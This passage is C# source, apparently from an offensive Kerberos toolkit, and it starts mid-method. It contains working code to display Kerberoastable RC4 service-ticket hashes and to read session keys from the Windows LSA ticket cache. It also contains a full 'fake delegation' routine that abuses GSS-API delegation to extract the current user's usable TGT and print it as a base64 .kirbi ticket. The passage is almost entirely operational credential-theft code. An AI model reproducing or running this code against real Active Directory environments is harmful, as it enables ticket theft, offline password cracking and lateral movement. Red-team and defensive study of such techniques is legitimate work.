            Console.WriteLine("  KeyType               :  {0}", keyType);
            Console.WriteLine("  Base64(key)           :  {0}", b64Key);

            if (extractKerberoastHash && !Regex.IsMatch(sname, "^krbtgt.*", RegexOptions.IgnoreCase))
            {
                // if this isn't a TGT, try to display a Kerberoastable hash
                if (!keyType.Equals("rc4_hmac"))
                {
                    // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
                    //      and we don't have the user account name that backs the requested SPN for the ticket, no no dice :(
                    Console.WriteLine("\r\n[!] Service ticket uses encryption key type '{0}', unable to extract hash and salt.", keyType);
                }
                else
                {
                    Roast.DisplayTGShash(cred);
                }
            }

            Console.WriteLine();
        }

        public static byte[] GetEncryptionKeyFromCache(string target, Interop.KERB_ETYPE etype)
        {
            // gets the cached session key for a given service ticket
            //  used by RequestFakeDelegTicket

            int authPack;
            IntPtr lsaHandle;
            int retCode;
            string name = "kerberos";
            byte[] returnedSessionKey;
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            retCode = Interop.LsaConnectUntrusted(out lsaHandle);
            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

            int returnBufferLength = 0;
            int protocalStatus = 0;
            IntPtr responsePointer = IntPtr.Zero;
            Interop.KERB_RETRIEVE_TKT_REQUEST request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
            Interop.KERB_RETRIEVE_TKT_RESPONSE response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

            // signal that we want encoded .kirbi's returned
            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;
            request.CacheOptions = (uint)Interop.KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
            request.EncryptionType = (int)etype;

            // target SPN to fake delegation for
            Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(target);
            request.TargetName = tName;

            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
            //      for KerbRetrieveEncodedTicketMessages

            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
            int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
            int newStructSize = structSize + tName.MaximumLength;
            IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

            // marshal the struct from a managed object to an unmanaged block of memory.
            Marshal.StructureToPtr(request, unmanagedAddr, false);

            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
            IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

            // copy unicode chars to the new location
            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

            // update the target name buffer ptr            
            Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size==8?24:16, newTargetNameBuffPtr);

            // actually get the data
            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

            // translate the LSA error (if any) to a Windows error
            uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
            {
                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                // extract the session key
                Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                byte[] sessionKey = new byte[sessionKeyLength];
                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);

                returnedSessionKey = sessionKey;
            }
            else
            {
                string errorMessage = new Win32Exception((int)winError).Message;
                Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, target, errorMessage);
                returnedSessionKey = null;
            }

            // clean up
            Interop.LsaFreeReturnBuffer(responsePointer);
            Marshal.FreeHGlobal(unmanagedAddr);

            // disconnect from LSA
            Interop.LsaDeregisterLogonProcess(lsaHandle);

            return returnedSessionKey;
        }

        public static byte[] RequestFakeDelegTicket(string targetSPN = "", bool display = true)
        {
            if (display)
            {
                Console.WriteLine("\r\n[*] Action: Request Fake Delegation TGT (current user)\r\n");
            }

            byte[] finalTGTBytes = null;

            if (String.IsNullOrEmpty(targetSPN))
            {
                if (display)
                {
                    Console.WriteLine("[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'");
                }
                string domainController = Networking.GetDCName();
                if(String.IsNullOrEmpty(domainController))
                {
                    Console.WriteLine("[X] Error retrieving current domain controller");
                    return null;
                }
                targetSPN = String.Format("cifs/{0}", domainController);
            }

            Interop.SECURITY_HANDLE phCredential = new Interop.SECURITY_HANDLE();
            Interop.SECURITY_INTEGER ptsExpiry = new Interop.SECURITY_INTEGER();
            int SECPKG_CRED_OUTBOUND = 2;

            // first get a handle to the Kerberos package
            int status = Interop.AcquireCredentialsHandle(null, "Kerberos", SECPKG_CRED_OUTBOUND, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref phCredential, ref ptsExpiry);

            if (status == 0)
            {
                Interop.SecBufferDesc ClientToken = new Interop.SecBufferDesc(12288);
                Interop.SECURITY_HANDLE ClientContext = new Interop.SECURITY_HANDLE(0);
                uint ClientContextAttributes = 0;
                Interop.SECURITY_INTEGER ClientLifeTime = new Interop.SECURITY_INTEGER(0);
                int SECURITY_NATIVE_DREP = 0x00000010;
                int SEC_E_OK = 0x00000000;
                int SEC_I_CONTINUE_NEEDED = 0x00090312;

                if (display)
                {
                    Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'", targetSPN);
                }

                // now initialize the fake delegate ticket for the specified targetname (default cifs/DC.domain.com)
                int status2 = Interop.InitializeSecurityContext(ref phCredential,
                            IntPtr.Zero,
                            targetSPN, // null string pszTargetName,
                            (int)(Interop.ISC_REQ.ALLOCATE_MEMORY | Interop.ISC_REQ.DELEGATE | Interop.ISC_REQ.MUTUAL_AUTH),
                            0, //int Reserved1,
                            SECURITY_NATIVE_DREP, //int TargetDataRep
                            IntPtr.Zero,    //Always zero first time around...
                            0, //int Reserved2,
                            out ClientContext, //pHandle CtxtHandle = SecHandle
                            out ClientToken, //ref SecBufferDesc pOutput, //PSecBufferDesc
                            out ClientContextAttributes, //ref int pfContextAttr,
                            out ClientLifeTime); //ref IntPtr ptsExpiry ); //PTimeStamp

                if ((status2 == SEC_E_OK) || (status2 == SEC_I_CONTINUE_NEEDED))
                {
                    if (display)
                    {
                        Console.WriteLine("[+] Kerberos GSS-API initialization success!");
                    }

                    if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) == 1)
                    {
                        if (display)
                        {
                            Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");
                        }

                        // the fake delegate AP-REQ ticket is now in the cache!

                        // the Kerberos OID to search for in the output stream
                        //  from Kekeo -> https://github.com/gentilkiwi/kekeo/blob/master/kekeo/modules/kuhl_m_tgt.c#L329-L345
                        byte[] KeberosV5 = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 }; // 1.2.840.113554.1.2.2
                        byte[] ClientTokenArray = ClientToken.GetSecBufferByteArray();
                        int index = Helpers.SearchBytePattern(KeberosV5, ClientTokenArray);
                        if (index > 0)
                        {
                            int startIndex = index += KeberosV5.Length;

                            // check if the first two bytes == TOK_ID_KRB_AP_REQ
                            if ((ClientTokenArray[startIndex] == 1) && (ClientTokenArray[startIndex+1] == 0))
                            {
                                if (display)
                                {
                                    Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
                                }

                                startIndex += 2;
                                byte[] apReqArray = new byte[ClientTokenArray.Length-startIndex];
                                Buffer.BlockCopy(ClientTokenArray, startIndex, apReqArray, 0, apReqArray.Length);

                                // decode the supplied bytes to an AsnElt object
                                //  false == ignore trailing garbage
                                AsnElt asn_AP_REQ = AsnElt.Decode(apReqArray, false);

                                foreach(AsnElt elt in asn_AP_REQ.Sub[0].Sub)
                                {
                                    if (elt.TagValue == 4)
                                    {
                                        // build the encrypted authenticator
                                        EncryptedData encAuthenticator = new EncryptedData(elt.Sub[0]);
                                        Interop.KERB_ETYPE authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;
                                        if (display)
                                        {
                                            Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);
                                        }

                                        // grab the service ticket session key from the local cache
                                        byte[] key = GetEncryptionKeyFromCache(targetSPN, authenticatorEtype);

                                        if (key != null)
                                        {
                                            string base64SessionKey = Convert.ToBase64String(key);
                                            if (display)
                                            {
                                                Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
                                            }

                                            // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11
                                            byte[] rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);

                                            AsnElt asnAuthenticator = AsnElt.Decode(rawBytes, false);

                                            foreach (AsnElt elt2 in asnAuthenticator.Sub[0].Sub)
                                            {
                                                if (elt2.TagValue == 3)
                                                {
                                                    if (display)
                                                    {
                                                        Console.WriteLine("[+] Successfully decrypted the authenticator");
                                                    }

                                                    int cksumtype = Convert.ToInt32(elt2.Sub[0].Sub[0].Sub[0].GetInteger());

                                                    // check if cksumtype == GSS_CHECKSUM_TYPE
                                                    if (cksumtype == 0x8003)
                                                    {
                                                        byte[] checksumBytes = elt2.Sub[0].Sub[1].Sub[0].GetOctetString();

                                                        // check if the flags include GSS_C_DELEG_FLAG
                                                        if ((checksumBytes[20] & 1) == 1)
                                                        {
                                                            ushort dLen = BitConverter.ToUInt16(checksumBytes, 26);
                                                            byte[] krbCredBytes = new byte[dLen];
                                                            // copy out the krbCredBytes from the checksum structure
                                                            Buffer.BlockCopy(checksumBytes, 28, krbCredBytes, 0, dLen);

                                                            AsnElt asn_KRB_CRED = AsnElt.Decode(krbCredBytes, false);
                                                            Ticket ticket = null;
                                                            KRB_CRED cred = new KRB_CRED();

                                                            foreach (AsnElt elt3 in asn_KRB_CRED.Sub[0].Sub)
                                                            {
                                                                if (elt3.TagValue == 2)
                                                                {
                                                                    // extract the TGT and add it to the KRB-CRED
                                                                    ticket = new Ticket(elt3.Sub[0].Sub[0].Sub[0]);
                                                                    cred.tickets.Add(ticket);
                                                                }
                                                                else if (elt3.TagValue == 3)
                                                                {
                                                                    byte[] enc_part = elt3.Sub[0].Sub[1].GetOctetString();

                                                                    // KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART = 14
                                                                    byte[] rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);

                                                                    // decode the decrypted plaintext enc par and add it to our final cred object
                                                                    AsnElt encKrbCredPartAsn = AsnElt.Decode(rawBytes2, false);
                                                                    cred.enc_part.ticket_info.Add(new KrbCredInfo(encKrbCredPartAsn.Sub[0].Sub[0].Sub[0].Sub[0]));
                                                                }
                                                            }

                                                            byte[] kirbiBytes = cred.Encode().Encode();
                                                            string kirbiString = Convert.ToBase64String(kirbiBytes);

                                                            if (display)
                                                            {
                                                                Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

                                                                // display the .kirbi base64, columns of 80 chararacters
                                                                foreach (string line in Helpers.Split(kirbiString, 80))
                                                                {
                                                                    Console.WriteLine("      {0}", line);
                                                                }
                                                            }

                                                            finalTGTBytes = kirbiBytes;
                                                        }
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine("[X] Error: Invalid checksum type: {0}", cksumtype);
                                                    }
                                                }
                                            }
                                        }
                                        else
                                        {
                                            Console.WriteLine("[X] Error: Unable to extract session key from cache for target SPN: {0}", targetSPN);
                                        }
                                    }
                                }
                            }
                            else
                            {
                                Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
                            }
                        }
                        else
                        {
                            Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
                        }
                    }
                    else {
                        Console.WriteLine("[X] Error: Client is not allowed to delegate to target: {0}", targetSPN);
                    }
                }
                else
                {
                    Console.WriteLine("[X] Error: InitializeSecurityContext error: {0}", status2);
                }
                // cleanup 1
                Interop.DeleteSecurityContext(ref ClientContext);
            }
            else
            {
                Console.WriteLine("[X] Error: AcquireCredentialsHandle error: {0}", status);
            }

            // cleanup 2
            Interop.FreeCredentialsHandle(ref phCredential);
            return finalTGTBytes;
        }

        public static Interop.LUID GetCurrentLUID()
        {
            // helper that returns the current logon session ID

            int TokenInfLength = 0;
            Interop.LUID luid = new Interop.LUID();

            // first call gets lenght of TokenInformation to get proper struct size
            bool Result = Interop.GetTokenInformation(WindowsIdentity.GetCurrent().Token, Interop.TOKEN_INFORMATION_CLASS.TokenOrigin, IntPtr.Zero, TokenInfLength, out TokenInfLength);

            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);

            // second call actually gets the information
            Result = Interop.GetTokenInformation(WindowsIdentity.GetCurrent().Token, Interop.TOKEN_INFORMATION_CLASS.TokenOrigin, TokenInformation, TokenInfLength, out TokenInfLength);

            if (Result)
            {
                Interop.TOKEN_ORIGIN TokenOrigin = (Interop.TOKEN_ORIGIN)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_ORIGIN));
                luid = new Interop.LUID(TokenOrigin.OriginatingLogonSession);
            }
            else
            {
                uint lastError = Interop.GetLastError();
                Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
                Marshal.FreeHGlobal(TokenInformation);
            }

            return luid;
        }
    }
}
